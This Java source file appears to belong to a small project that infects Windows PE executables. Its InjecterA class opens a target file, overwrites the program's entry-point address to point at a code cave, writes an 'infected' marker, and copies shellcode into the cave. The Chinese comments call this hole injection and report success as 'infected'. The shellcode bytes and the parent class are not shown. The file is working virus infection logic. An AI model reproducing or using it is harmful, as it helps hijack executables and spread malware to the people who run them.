/*
 * @Descripttion: your project
 * @version: 1.0
 * @Author: Yhank
 * @Date: 2021-10-25 17:35:26
 * @LastEditors: Yhank
 * @LastEditTime: 2021-10-30 22:20:38
 */
package InjectModule;

import java.io.*;

public class InjecterA extends AbstractInjecter {

    // 采取空穴注入的方式
    long holeStartRawOffset = -1;
    long holeStartRva = -1;

    public InjecterA(String filePath, long holeStartRawOffset, long holeStartRva, long aOEPRawStore,
            long addressOfEntryPointRVA) {
        super(filePath, aOEPRawStore, addressOfEntryPointRVA);
        this.holeStartRawOffset = holeStartRawOffset;
        this.holeStartRva = holeStartRva;
    }

    @Override
    public int inject() {
        try {
            RandomAccessFile raf = new RandomAccessFile(filePath, "rw");
            // 改 addressOfEntryPoint
            byte[] writeBuf1 = uf.back4Byte(holeStartRva); // 获得rva
            raf.seek(aOEPRawStore);
            raf.write(writeBuf1); // 改写完成

            // 写入已经感染的标志
            raf.seek(holeStartRawOffset - 0x4);
            raf.write(isInfectedSignture);

            for (int k = 0; k < shellCode.length; k++) {
                raf.seek(holeStartRawOffset + k);
                raf.write((byte) (shellCode[k]));
            }
            raf.close();
        } catch (IOException e) {
            e.printStackTrace();
            return -1;
        }
        // 返回true表示已经成功感染
        return 0;
    }

}
/*
 * @Descripttion: your project
 * 
 * @version: 1.0
 * 
 * @Author: Yhank
 * 
 * @Date: 2021-10-25 17:35:26
 * 
 * @LastEditors: Yhank
 * 
 * @LastEditTime: 2021-10-25 17:35:27
 */
